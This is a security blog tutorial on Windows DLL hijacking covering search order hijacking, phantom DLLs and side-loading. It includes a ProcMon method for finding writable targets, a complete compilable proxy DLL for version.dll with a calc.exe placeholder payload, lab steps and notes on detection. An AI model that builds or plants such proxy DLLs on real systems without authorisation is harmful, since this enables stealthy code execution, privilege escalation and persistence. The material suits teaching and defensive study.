---
title: 'DLL Hijacking: Three Variants with Procmon Methodology'
description: 'How to find and exploit DLL search order hijacking, Phantom DLLs, and DLL side-loading using Process Monitor.'
pubDate: 2026-04-03
order: 6
tags: ['windows-internals', 'dll-hijacking', 'privilege-escalation', 'procmon']
---

Press enter or click to view image in full size

what if you didn’t need to [hollow](/windows-internals/process-hollowing/) anything? What if Windows itself loads your malicious code, willingly, through its own loader?

That’s DLL hijacking — the OS doing your dirty work.

## How Windows Finds DLLs — The Search Order

when a process calls :

LoadLibrary("example.dll");

Windows now has a problem:

> _“Where exactly is_ `_example.dll_` _located?”_

Because only a filename was given — not a full path.

So the Windows Loader (`LdrLoadDll` inside `ntdll.dll`) begins searching through multiple locations in a specific order.

That search order is what attackers abuse.

There are Basically Two categories :

*   Standard Search Locations  
    Normal DLL resolution path
*   Special Search Locations  
    Extra trusted/preferred/forced locations used by Windows

Press enter or click to view image in full size

search order

### Phase 1: Special Search Locations

Before scanning the physical directories on your hard drive, Windows checks several internal, memory-based, or configuration-based mechanisms to see if the DLL is already handled:

1.  DLL Redirection: Windows first checks if a specific redirection file or rule exists for the application.( If a `.local` file or `app.exe.local` folder exists alongside the application, Windows redirects DLL loads to that location )
2.  API Sets: It then checks if the requested DLL is an API Set name that needs to be resolved to a physical DLL.

*   When an app requests something like `api-ms-win-core-processthreads-l1-1-0.dll`, the API Set schema maps it to the real DLL (`kernelbase.dll` or similar) before any filesystem search happens.
*   You can’t hijack an API Set dependency with a dropped file — it never reaches the filesystem.

3\. SxS Manifest Redirection: The system checks Side-by-Side (SxS) manifests to see if the application requires a specific version of the DLL.

*   If it does, Windows loads from the WinSxS store — again, bypassing the filesystem search entirely.

4\. Loaded-Module List: Windows checks if the requested DLL is already loaded into the current process’s memory space.

*   If the DLL is already loaded in the process — already present in `InMemoryOrderModuleList` — the loader returns the existing mapping. No disk access at all.
*   This is why injecting a DLL once makes subsequent `LoadLibrary` calls for the same name return your version — it's already in the list

5\. Known DLLs: It checks a pre-defined registry list of core Windows DLLs. If it’s a “Known DLL,” Windows will always use the system copy, preventing hijacking of critical files.

*   The kernel pre-maps a set of critical system DLLs at boot and stores them as named section objects under `\KnownDLLs`. When the loader encounters a DLL name that matches, it maps directly from that section object. The filesystem is never consulted.
*   This is why you cannot hijack `ntdll.dll`, `kernel32.dll`, `user32.dll`, or `kernelbase.dll` by dropping a file anywhere — they are resolved before the filesystem search begins.
*   You can see the full `KnownDLLs` list yourself:

Sysinternals WinObj → navigate to \\KnownDLLs

6\. Package Dependency Graph of Process: It checks the dependency graph for the specific application package, Before Standard Locations.

If the DLL hasn’t been found or resolved in the first phase, Windows moves on to querying directories on the disk.

This is where the majority of standard DLL hijacking opportunities arise. It searches in this exact order:

1.  Application’s Directory: The folder from which the executable file was launched.

*   The application’s own directory comes first — before System32, before anything else. This was intentional.
*   Applications in the Windows 95 era were expected to ship their own DLL versions alongside their executables, and Windows needed to respect that. That backward-compatibility decision has never been reversed.

Why attackers care: if an application’s directory is writable by a non-admin user — which is common for software installed under Program Files with weak ACLs, or anything in a user-controlled path — you can place a DLL there and the loader picks it up before the legitimate copy in System32 is ever checked.

1.  `C:\Windows\System32`: The primary system directory.
2.  `C:\Windows\System`: The legacy system directory.
3.  `C:\Windows`: The main Windows directory.
4.  Current Directory: The directory the process is currently executing in (which can sometimes be different from the application’s launch directory).
5.  Directories Listed in PATH Variable: Finally, if it hasn’t found the DLL anywhere else, Windows sweeps through all the directories specified in the system’s `%PATH%` environment variable.

Safe DLL Search Mode slightly adjusts this standard list by deprioritizing the current working directory, moving it later in the order. It’s enabled by default:

HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager  
SafeDllSearchMode = 1

It protects against working-directory attacks specifically. The application directory is untouched — it stays first. Safe DLL Search Mode is a partial mitigation that addresses one variant of the problem while leaving the most practical variant completely open.

Understanding this full picture matters because it tells you exactly which DLLs are hijackable and which aren’t — before you touch ProcMon.

If a DLL name appears in KnownDLLs or gets resolved via API Sets, no dropped file will intercept it. Everything else is fair game.

The exact DLL search order varies depending on:

*   SafeDllSearchMode
*   whether LoadLibraryEx is used
*   SxS activation contexts
*   packaged application behavior
*   custom DLL directories

The order above reflects the common unpackaged desktop application search behavior when no custom loader flags are specified.

avior when no custom loader flags are specified.

## Common DLL Hijacking Implementations

The three most common techniques attackers use are DLL side-loading, DLL search order hijacking and phantom DLL loading. The most common technique is DLL side-loading

### DLL Search Order Hijacking

This implementation exemplifies the core abuse of the entire Windows DLL search order.

This technique simply leverages the Windows DLL search order to drop a malicious DLL in any of its searched locations that would cause a vulnerable, legitimate program to execute a malicious DLL.

An attacker can place a malicious DLL in a location prioritized by the DLL search order before the location of a valid DLL.

This can happen at any point in the DLL search order, including the PATH environment variable, which attackers can modify by adding a path directory with a malicious DLL.

An example of this type of attack is to drop a malicious DLL in a Python installation directory to hijack the DLL search order.

When Python is installed on a Windows machine, it often adds its installation directory to the PATH environment variable, usually in one of the first searched locations.

Python folders in the PATH environment variable

Installing Python on a Windows host creates a directory with relaxed permissions, allowing any authenticated user (including unprivileged ones) to write to this location.

This gives attackers the best conditions to execute their DLL search order hijack attack and infect the targeted machine.

### Phantom DLL Loading

In this technique, attackers look for a vulnerable executable that attempts to load a DLL that simply doesn't exist (or is missing) due to an implementation bug.

Then, attackers will plant a malicious DLL with the non-existent DLL’s filename in its expected location.

A familiar example of this technique is the abuse of the Windows Search (WSearch) Service.  
This service is responsible for search operations and it launches with SYSTEM privileges upon system startup.(Historical)

When this service starts, it executes `SearchIndexer.exe` and `SearchProtocolHost.exe`, which both attempt to load `msfte.dll` from S_ystem32_ . In default Windows installations, the file does not exist in this location.

An adversary can plant their malicious DLL if they can write to the System32 folder or an alternate DLL search order location, or insert another attacker-controlled location into the PATH environment variable.

This allows them to gain a stealthy pathway for execution with `SYSTEM` privileges, and a means to maintain persistence on the machine.

### DLL Side-Loading

In this most commonly used DLL-hijacking technique, an attacker obtains a legitimate executable that loads a specifically named DLL without specifying the DLL file's full directory path.

DLL side-loading uses a malicious DLL renamed to the same filename of a legitimate DLL, one normally used by a legitimate executable.

Attackers drop the legitimate executable and a malicious, renamed DLL within a directory they have access to.

In DLL side-loading, the attackers rely on the fact that the executable’s directory is one of the first locations Windows searches for.

## Finding Candidates with ProcMon — The Methodology

Knowing the three variants is theory. ProcMon is where theory becomes a target list.

Process Monitor captures every filesystem operation a process makes in real time — including every DLL load attempt, successful or not. The ones that _fail_ are your attack surface.

A failed DLL load means Windows looked for something, didn't find it, and moved on. That's your opening.

### Setting Up the Filter

Open ProcMon and set these two filters before launching your target application:

Result    is    NAME NOT FOUND  
Path      ends with    .dll

This cuts through the noise. You're left with only the DLL requests that the loader made and got nothing back for.

Every single line in that filtered output is a location where Windows expected a DLL and found empty space.

Now launch your target application with ProcMon running.

### Reading the Output

Each line in ProcMon tells you three things:

Process Name    →    which executable made the request  
Path            →    full path Windows searched  
Result          →    NAME NOT FOUND

The Path column is what matters. It tells you exactly where the loader looked. Cross-reference that path with two questions:

1\. Is this location writable by a non-admin user?

icacls "C:\\Path\\To\\Directory"

Look for `(W)` or `(F)` next to any non-admin group — `BUILTIN\Users`, `Everyone`, `INTERACTIVE`. If it's there, you can drop a file there without elevation.

2\. Does a legitimate version of this DLL exist elsewhere on the system?

where /R C:\\Windows version.dll

If it exists in System32 but the app searched its own directory first and got `NAME NOT FOUND` — that's a Search Order Hijacking candidate. The real DLL exists, but the app checked a writable location before finding it.

If the DLL doesn't exist _anywhere_ on the system — that's a Phantom DLL candidate. Nothing to compete with. You're filling a void.

### Identifying Side-Loading Candidates

Side-loading candidates don't always show up as `NAME NOT FOUND`. Sometimes the application successfully loads a DLL — but from a location you can influence.

Add a second filter alongside your existing ones:

Operation    is    Load Image

Now look for DLLs loading from the application's own directory. If that directory has weak ACLs and the DLL being loaded isn't in KnownDLLs — you have a side-loading candidate. The app is already loading from a controllable location. You just need to replace what's there with a proxy.

### Turning a Finding into a Confirmed Target

Not every `NAME NOT FOUND` result is exploitable. Before you build a DLL, confirm three things:

The directory is writable:

icacls "C:\\Program Files\\TargetApp\\"

The DLL name isn't in KnownDLLs:

WinObj → \\KnownDLLs → check if the name appears

The application actually uses the DLL in a meaningful code path — not just at startup and never again. A DLL loaded once at launch and then ignored means your payload executes once. A DLL loaded repeatedly means repeated execution opportunities.

Once all three are confirmed, you have a legitimate target. The next step is building something that loads into it without breaking the application — which is where the proxy DLL comes in.

## The Proxy DLL — Don't Break What You're Hijacking

Finding a candidate is half the work. The other half is making sure your DLL doesn't crash the application the moment it loads.

Here's the problem most people run into on their first attempt.

You found a candidate. Some application tries to load `version.dll` from its own directory. That directory is writable. `version.dll` isn't in KnownDLLs. You compile a basic DLL that runs your payload in `DllMain`, name it `version.dll`, drop it in the directory, and launch the application.

Two things can happen:

Application loads → payload executes → application keeps running.

Application loads → payload executes → application immediately crashes.

Scenario B happens more often than you'd expect. And a crashed application is a problem — not because it's a technical failure, but because a crashed application is noise. The user notices. On a real engagement, that's the one thing you can't afford.

So why does it crash?

### The Export Table Problem

When an application loads a DLL, it doesn't just load it and move on. It calls specific exported functions from that DLL throughout its lifetime.

`version.dll` is the Windows Version API library. Applications use it to check file version information. Functions like:

GetFileVersionInfoA  
GetFileVersionInfoSizeW  
VerQueryValueA  
VerQueryValueW

When the application calls `LoadLibrary("version.dll")`, Windows loads your DLL. Fine. But then at some point, the application calls `GetFileVersionInfoSize()`. It looks for that function in the loaded `version.dll` — which is your DLL. Your DLL doesn't export it. Windows returns `NULL`. The application tries to call a `NULL` function pointer.

That's your crash.

Every DLL has an export table — a list of functions it makes available to any process that loads it. You can see it with:

dumpbin /exports C:\\Windows\\System32\\version.dll

ordinal  name  
      1  GetFileVersionInfoA  
      2  GetFileVersionInfoByHandle  
      3  GetFileVersionInfoExA  
      4  GetFileVersionInfoExW  
      5  GetFileVersionInfoSizeA  
      6  GetFileVersionInfoSizeW  
      9  GetFileVersionInfoW  
     16  VerQueryValueA  
     17  VerQueryValueW

Every function in that output is something the application might call. If your DLL doesn't export them, any call to them crashes the application.

This is the exact problem a proxy DLL solves.

### What a Proxy DLL Actually Does

Your DLL needs to satisfy two requirements at the same time:

*   Execute your payload
*   Export every function the application expects — and make those functions actually work

The proxy pattern handles both. Your DLL intercepts the load, runs your payload, and then forwards every function call transparently to the real DLL in System32.

Application calls GetFileVersionInfoA()  
        ↓  
Your version.dll (proxy)  
  → DllMain fires → your payload executes  
  → GetFileVersionInfoA() forwarded to real version.dll  
        ↓  
C:\\Windows\\System32\\version.dll  
        ↓  
Returns valid result to application

The application called `GetFileVersionInfoA`, got a valid result, and kept running. Your payload already executed silently before any of that happened. The application never noticed anything changed.

### DllMain — Where Your Code Lives

Every DLL has a `DllMain` function. This is the entry point the Windows loader calls automatically the moment your DLL is mapped into the process. You don't trigger it — Windows does.

c

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {  
    if (dwReason == DLL\_PROCESS\_ATTACH) {  
        // your payload runs here  
    }  
    return TRUE;  
}

`DLL_PROCESS_ATTACH` fires exactly once — the instant the loader maps your DLL into the process address space. Before the application gets control back from `LoadLibrary`. Before it calls a single exported function.

The execution order is:

Application calls LoadLibrary("version.dll")  
        ↓  
Loader maps your DLL into process memory  
        ↓  
Loader calls DllMain(DLL\_PROCESS\_ATTACH) ← your payload runs here  
        ↓  
LoadLibrary returns handle to your DLL  
        ↓  
Application calls exported functions on your DLL  
        ↓  
Your exports forward calls to real version.dll  
        ↓  
Application gets valid results, keeps running

You return `TRUE` from `DllMain`. The loader considers the DLL successfully initialized. Everything continues normally.

### Export Forwarding — Making the Application Happy

This is the part that makes the proxy work. At the top of your DLL source, before any code, you add pragma linker directives — one per exported function:

c

#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoA,@1")  
#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoW,@9")  
#pragma comment(linker, "/export:VerQueryValueA=C:\\\\Windows\\\\System32\\\\version.VerQueryValueA,@16")  
// one line for every export in the real DLL

The format is:

/export:YourExportName=RealDLLPath.RealFunctionName,@OrdinalNumber

What this does: it adds entries to your DLL's export table that don't point to code inside your DLL — they point directly to the corresponding function in the real DLL. Windows resolves these at load time. When the application calls `GetFileVersionInfoA` on your DLL, Windows follows the forward pointer straight to the real function in System32.

The `@1` at the end is the ordinal number — the numeric identifier for that export. It needs to match the ordinal from the real DLL's export table exactly. Applications that import by ordinal instead of by name will break if this doesn't match.

Two things that catch people out here:

The path uses double backslashes in C strings. And the DLL name does not include `.dll`:

c

// correct  
"C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoA"  
  
// wrong — will not link  
"C:\\\\Windows\\\\System32\\\\version.dll.GetFileVersionInfoA"

The linker already knows it's a DLL. Don't add the extension.

### The Complete Proxy

Putting it together — a full proxy for `version.dll`:

c

#pragma comment(linker,"/export:GetFileVersionInfoA=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoA,@1")  
#pragma comment(linker,"/export:GetFileVersionInfoByHandle=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoByHandle,@2")  
#pragma comment(linker,"/export:GetFileVersionInfoExA=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoExA,@3")  
#pragma comment(linker,"/export:GetFileVersionInfoExW=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoExW,@4")  
#pragma comment(linker,"/export:GetFileVersionInfoSizeA=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoSizeA,@5")  
#pragma comment(linker,"/export:GetFileVersionInfoSizeExA=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoSizeExA,@6")  
#pragma comment(linker,"/export:GetFileVersionInfoSizeExW=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoSizeExW,@7")  
#pragma comment(linker,"/export:GetFileVersionInfoSizeW=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoSizeW,@8")  
#pragma comment(linker,"/export:GetFileVersionInfoW=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoW,@9")  
#pragma comment(linker,"/export:VerFindFileA=C:\\\\Windows\\\\System32\\\\version.VerFindFileA,@10")  
#pragma comment(linker,"/export:VerFindFileW=C:\\\\Windows\\\\System32\\\\version.VerFindFileW,@11")  
#pragma comment(linker,"/export:VerInstallFileA=C:\\\\Windows\\\\System32\\\\version.VerInstallFileA,@12")  
#pragma comment(linker,"/export:VerInstallFileW=C:\\\\Windows\\\\System32\\\\version.VerInstallFileW,@13")  
#pragma comment(linker,"/export:VerLanguageNameA=C:\\\\Windows\\\\System32\\\\version.VerLanguageNameA,@14")  
#pragma comment(linker,"/export:VerLanguageNameW=C:\\\\Windows\\\\System32\\\\version.VerLanguageNameW,@15")  
#pragma comment(linker,"/export:VerQueryValueA=C:\\\\Windows\\\\System32\\\\version.VerQueryValueA,@16")  
#pragma comment(linker,"/export:VerQueryValueW=C:\\\\Windows\\\\System32\\\\version.VerQueryValueW,@17")  
  
#include <Windows.h>  
  
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {  
    if (dwReason == DLL\_PROCESS\_ATTACH) {  
        WinExec("calc.exe", SW\_HIDE);  
    }  
    return TRUE;  
}

Compile it:

cl /LD version.c /o version.dll

Drop it in the hijackable directory. Launch the target. Your payload runs. Application keeps running. Nobody crashes.

## Detection — What EDRs Actually See

DLL hijacking is stealthy by design. The loader does the loading, a legitimate process does the executing, and your DLL may even be sitting in a location that looks completely reasonable. But it's not invisible.

Sysmon Event ID 7 — ImageLoad is the primary telemetry source. Every DLL load generates this event with the full image path and the signing status of the loaded module. A defender looking at Event 7 can ask two questions:

Is this DLL being loaded from a user-writable path?  
Is this DLL signed by a trusted publisher?

An unsigned DLL loading from `C:\Program Files\SomeApp\version.dll` when `version.dll` is a known signed Microsoft binary is a high-confidence signal.

The combination of path anomaly plus missing signature is what triggers a detection — not either one alone.

What makes search order hijacking and phantom DLL loading detectable: the loaded path doesn't match where the legitimate DLL should be. A defender with a baseline of "what DLLs load from where on a clean system" catches this immediately on comparison.

What makes side-loading harder to detect: the loading process is a legitimate, signed binary. The DLL path may look reasonable — it's in the same directory as the executable. The parent process is trusted. Without signature verification of the loaded DLL itself, it blends in.

This is exactly why real APT groups — Lazarus, APT41, and others — rely on side-loading over the other two variants. The legitimacy of the loader provides cover.

The full detection picture requires correlating three things together:

Load path + signing status + parent process reputation

Any one of those alone is insufficient. All three together is a reliable signal.

## Lab — See It Yourself

What you need: ProcMon, Process Hacker, WinObj (Sysinternals), a Windows lab VM

Lab 1 — Map the KnownDLLs boundary

Sysinternals WinObj → navigate to \\KnownDLLs

Write down every DLL name you see there. These are permanently off-limits for search order hijacking. Everything not on this list is theoretically fair game. This gives you an instant mental filter before you open ProcMon.

Lab 2 — Find phantom DLL candidates with ProcMon

Set filters:

Result    is    NAME NOT FOUND  
Path      ends with    .dll

Launch any application you have installed — VLC, Notepad++, 7-Zip. Let it fully load. Scroll through the results. For each entry, ask:

icacls "C:\\path\\from\\procmon\\output"

Any directory showing `(W)` or `(F)` for `BUILTIN\Users` is a writable candidate. Cross-reference the DLL name against your KnownDLLs list from Lab 1.

What this proves: you can go from zero knowledge to a confirmed hijackable target in under 10 minutes on almost any Windows system with third-party software installed.

Lab 3 — Verify a candidate end to end

Pick one confirmed candidate from Lab 2. Build a minimal DLL that just spawns `calc.exe` in `DllMain`:

c

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {  
    if (reason == DLL\_PROCESS\_ATTACH) {  
        WinExec("calc.exe", SW\_SHOW);  
    }  
    return TRUE;  
}

Drop it in the writable path. Launch the target application. If calc opens — you have confirmed execution.

Then open Process Hacker, find the target process, go to the Modules tab, and find your DLL in the loaded module list. Note the path and the missing signature field.

What this proves: the full chain from ProcMon finding to confirmed code execution, exactly as a real engagement would flow.

## What's Next

DLL hijacking relies on the Windows loader doing its job — finding and mapping your DLL because the application asked for it. But what if you're writing shellcode that runs before any loader exists? How does shellcode find the functions it needs without calling `GetProcAddress` or importing anything?

The answer is in the PEB — the same structure you've seen referenced across every blog in this series. Next post: Walking the PEB to Resolve APIs — How Shellcode Finds kernel32.dll Without Imports.